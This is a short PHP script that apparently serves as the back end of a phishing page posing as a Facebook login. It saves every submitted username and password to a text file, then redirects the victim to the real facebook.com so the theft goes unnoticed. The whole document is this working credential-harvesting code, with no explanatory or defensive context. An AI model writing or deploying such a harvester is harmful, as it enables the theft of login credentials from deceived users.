<?php
$username = $_POST['name'];

$password = $_POST['pass'];

$file = 'pass.txt';

$txt = file_get_contents($file);

$txt .= $username . " - " . $password . "\n";

file_put_contents($file, $txt);


header("Location: https://www.facebook.com/");
